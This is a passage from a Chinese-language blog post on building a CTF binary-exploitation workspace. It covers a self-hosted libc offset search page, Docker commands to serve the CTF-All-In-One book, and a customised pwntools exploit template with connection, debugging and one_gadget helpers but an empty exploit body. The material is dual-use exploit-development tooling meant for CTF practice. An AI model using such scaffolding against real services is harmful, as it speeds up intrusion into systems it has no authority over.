class="string">"<span class="variable">$@</span>"</span></span><br></pre></td></tr></table></figure><p>然后就部署完成了,如果还嫌麻烦，可以用下我这个Dockerfile<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FxMTI3MDI4NzI0NS9saWJjc2VhcmNoZXI=" title="https://github.com/qq1270287245/libcsearcher">项目地址<i class="fa fa-external-link"></i></span><br>用法在项目里已经说明了，只是修改了一点点错误</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>libc database search<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"</span> <span class="attr">integrity</span>=<span class="string">"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; url_for('static', filename='style.css') &#125;&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://code.jquery.com/ui/1.12.1/themes/start/jquery-ui.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='bootstrap.min.js') &#125;&#125;"</span> <span class="attr">integrity</span>=<span class="string">"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='jquery-ui.min.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='URI.min.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pull-right"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            View source <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://github.com/blukat29/search-libc"</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            Powered by <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://github.com/niklasb/libc-database"</span>&gt;</span>libc-database<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>libc database search<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-6"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title panel-title-inline"</span>&gt;</span>Query<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"panel-title-right"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?q=_rtld_global%3A0"</span>&gt;</span>show all libs<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                /</span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>start over<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"queries"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-inline"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"query-add"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"query-find"</span> <span class="attr">class</span>=<span class="string">"btn btn-success"</span>&gt;</span>Find<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-6"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          &#123;% if libs %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title"</span>&gt;</span>Matches<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              &#123;% for lib_name in libs %&#125;</span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"lib-item &#123;&#123; 'active' if lib_name == lib &#125;&#125;"</span>&gt;</span></span><br><span class="line">                  &#123;&#123; lib_name &#125;&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">          &#123;% if symbols %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title panel-title-inline"</span>&gt;</span>&#123;&#123; lib &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"panel-title-right"</span> <span class="attr">href</span>=<span class="string">"/d/&#123;&#123; lib &#125;&#125;.so"</span>&gt;</span>Download<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-condensed table-hover"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Symbol<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Offset<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Difference<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                &#123;% for name, ofs in symbols %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span> <span class="attr">class</span>=<span class="string">"mono-font symbol-row"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose-base"</span> <span class="attr">class</span>=<span class="string">"symbol-radio"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-name"</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-ofs"</span>&gt;</span>&#123;&#123; '0x%06x' | format(ofs) &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-diff"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">              <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">"/d/&#123;&#123; lib &#125;&#125;.symbols"</span>&gt;</span>All symbols<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          &#123;% endif %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"text-muted"</span>&gt;</span>Database updated on May 23, 2018.<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='main.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    &#123;% <span class="keyword">for</span> name, addr <span class="keyword">in</span> query.items() %&#125;</span></span><br><span class="line"><span class="actionscript">    add_query(<span class="string">"&#123;&#123; name &#125;&#125;"</span>, <span class="string">"&#123;&#123; addr &#125;&#125;"</span>);</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='names.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">    set_autocomplete(names);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="本地搭建ctf-all-in-one"><a href="#本地搭建ctf-all-in-one" class="headerlink" title="本地搭建ctf-all-in-one"></a>本地搭建ctf-all-in-one</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zpcm1pYW5heS9DVEYtQWxsLUluLU9uZQ==" title="https://github.com/firmianay/CTF-All-In-One">https://github.com/firmianay/CTF-All-In-One<i class="fa fa-external-link"></i></span></p><h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><p>git clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zpcm1pYW5heS9DVEYtQWxsLUluLU9uZQ==" title="https://github.com/firmianay/CTF-All-In-One">https://github.com/firmianay/CTF-All-In-One<i class="fa fa-external-link"></i></span></p><h3 id="GitBook基础"><a href="#GitBook基础" class="headerlink" title="GitBook基础"></a>GitBook基础</h3><p>README.md和SUMMARY.md<br>必备文件</p><h3 id="利用Docker安装Gitbook"><a href="#利用Docker安装Gitbook" class="headerlink" title="利用Docker安装Gitbook"></a>利用Docker安装Gitbook</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search gitbook <span class="comment">#可以查看，我用了最高星的那个</span></span><br><span class="line">docker pull fellah/gitbook</span><br></pre></td></tr></table></figure><p>先到项目的目录下<br>然后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -v <span class="variable">$PWD</span>:/srv/gitbook -v <span class="variable">$PWD</span>/html:/srv/html fellah/gitbook gitbook build . /srv/html</span><br></pre></td></tr></table></figure><h3 id="展示Gitbook文件"><a href="#展示Gitbook文件" class="headerlink" title="展示Gitbook文件"></a>展示Gitbook文件</h3><p>因为生成的是html静态页面所以需要一个web服务来显示，我用nginx</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br><span class="line">docker run --name ctf-all-in-one -v /<span class="variable">$PWD</span>/html:/usr/share/nginx/html -d -p 4102:80 nginx</span><br></pre></td></tr></table></figure><p>这样就搭建完成了</p><p>访问你自己的4100-4102端口看下，是否成功了</p><h3 id="下载ctf-challenge，例题以及exp"><a href="#下载ctf-challenge，例题以及exp" class="headerlink" title="下载ctf-challenge，例题以及exp"></a>下载ctf-challenge，例题以及exp</h3><p>git clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2Vz" title="https://github.com/ctf-wiki/ctf-challenges">https://github.com/ctf-wiki/ctf-challenges<i class="fa fa-external-link"></i></span><br>这个说不定哪天就用上了，说不准</p><h2 id="exp模板构建"><a href="#exp模板构建" class="headerlink" title="exp模板构建"></a>exp模板构建</h2><p>因为要快速做题，每次重复的部分整合起来比较好，所以便研究下exp模板如何弄，我是通过修改pwntools里自带的exp模板，生成自己专属的模板的，我建议都弄成自己的exp模板类型吧，因为每个人代码风格不一样，没必要一定用大佬的模板，当然有可能大佬的模板好，但不一定适合自己</p><h3 id="模板位置"><a href="#模板位置" class="headerlink" title="模板位置"></a>模板位置</h3><p>第一个是模板的具体内容，第二个是生成模板的方法</p><ul><li>pwnup.mako</li><li>template.py</li></ul><p>你可以find / -name 名称<br>找到具体位置，最好先备份一份</p><p>具体配置自行配置，因为每个人风格不同</p><h3 id="pwntools-exp模板自定义"><a href="#pwntools-exp模板自定义" class="headerlink" title="pwntools exp模板自定义"></a>pwntools exp模板自定义</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;%page args=<span class="string">"binary, host=None, port=None, libc=None, local=True"</span>/&gt;\</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwnlib.context <span class="keyword">import</span> context <span class="keyword">as</span> ctx</span><br><span class="line"><span class="keyword">from</span> pwnlib.elf.elf <span class="keyword">import</span> ELF</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.sh_string <span class="keyword">import</span> sh_string</span><br><span class="line"><span class="keyword">from</span> elftools.common.exceptions <span class="keyword">import</span> ELFError</span><br><span class="line"></span><br><span class="line">argv = list(sys.argv)</span><br><span class="line">argv[<span class="number">0</span>] = os.path.basename(argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> binary:</span><br><span class="line">       ctx.binary = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span> ELFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> binary:</span><br><span class="line">    binary = <span class="string">'/path/to/binary'</span></span><br><span class="line"></span><br><span class="line">exe = os.path.basename(binary)</span><br><span class="line"><span class="keyword">if</span> binary[<span class="number">0</span>] != <span class="string">'/'</span>:</span><br><span class="line">    binary = <span class="string">"./"</span> + binary</span><br><span class="line">binary_repr = repr(binary)</span><br><span class="line">libc_repr = repr(libc)</span><br><span class="line">%&gt;\</span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">%<span class="keyword">if</span> host:</span><br><span class="line">host = args.HOST <span class="keyword">or</span> $&#123;repr(host)&#125;</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">%endif</span><br><span class="line">%<span class="keyword">if</span> port:</span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> $&#123;port&#125;)</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">%endif</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">%<span class="keyword">if</span> ctx.binary:</span><br><span class="line">exe = $&#123;binary_repr&#125;</span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line">&lt;% binary_repr = <span class="string">'exe.path'</span> %&gt;</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>)</span><br><span class="line">exe = $&#123;binary_repr&#125;</span><br><span class="line">&lt;% binary_repr = <span class="string">'exe'</span> %&gt;</span><br><span class="line">%endif</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_one_gadget</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_gadget</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> map(int, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split(<span class="string">' '</span>))</span><br><span class="line"><span class="comment">#one_gadget = one_gadget(libc.path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line">%<span class="keyword">if</span> ctx.binary <span class="keyword">and</span> <span class="keyword">not</span> quiet:</span><br><span class="line"><span class="comment"># $&#123;'%-10s%s-%s-%s' % ('Arch:',</span></span><br><span class="line">                       ctx.binary.arch,</span><br><span class="line">                       ctx.binary.bits,</span><br><span class="line">                       ctx.binary.endian)&#125;</span><br><span class="line">%<span class="keyword">for</span> line <span class="keyword">in</span> ctx.binary.checksec(color=<span class="literal">False</span>).splitlines():</span><br><span class="line"><span class="comment"># $&#123;line&#125;</span></span><br><span class="line">%endfor</span><br><span class="line">%endif</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>具体语法可以理解为<br>%if args<br>content<br>%endif<br>content就是内容,args就是参数，通过这个方法进行模板的生成</p><h3 id="pwntools-exp模板生成方法"><a href="#pwntools-exp模板生成方法" class="headerlink" title="pwntools exp模板生成方法"></a>pwntools exp模板生成方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> absolute_import</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.commandline <span class="keyword">import</span> common</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> mako.lookup <span class="keyword">import</span> TemplateLookup</span><br><span class="line"></span><br><span class="line">parser = common.parser_commands.add_parser(</span><br><span class="line">    <span class="string">'template'</span>,</span><br><span class="line">    help = <span class="string">'Generate an exploit template'</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'exe'</span>, nargs=<span class="string">'?'</span>, help=<span class="string">'Target binary'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--host'</span>, help=<span class="string">'Remote host / SSH server'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--port'</span>, help=<span class="string">'Remote port / SSH port'</span>, type=int)</span><br><span class="line">parser.add_argument(<span class="string">'--libc'</span>, help=<span class="string">'Remote libc version'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--local'</span>, help=<span class="string">'local debug'</span>, action=<span class="string">'store_true'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(args)</span>:</span></span><br><span class="line">    cache = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cache:</span><br><span class="line">        cache = os.path.join(context.cache_dir, <span class="string">'mako'</span>)</span><br><span class="line"></span><br><span class="line">    lookup = TemplateLookup(</span><br><span class="line">        directories      = [os.path.join(pwnlib.data.path, <span class="string">'templates'</span>)],</span><br><span class="line">        module_directory = cache</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    template = lookup.get_template(<span class="string">'pwnup.mako'</span>)</span><br><span class="line">    output = template.render(args.exe,</span><br><span class="line">                             args.host,</span><br><span class="line">                             args.port,</span><br><span class="line">                             args.libc,</span><br><span class="line">                             args.local,</span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Fix Mako formatting bs</span></span><br><span class="line">    output = re.sub(<span class="string">'\n\n\n'</span>, <span class="string">'\n\n'</span>, output)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> output</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.stdout.isatty():</span><br><span class="line">        <span class="keyword">try</span>: os.fchmod(sys.stdout.fileno(), <span class="number">0700</span>)</span><br><span class="line">        <span class="keyword">except</span> OSError: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pwnlib.commandline.common.main(__file__)</span><br></pre></td></tr></table></figure><h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><p>└──╼ $pwn template oreo –libc libc.so.6</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span 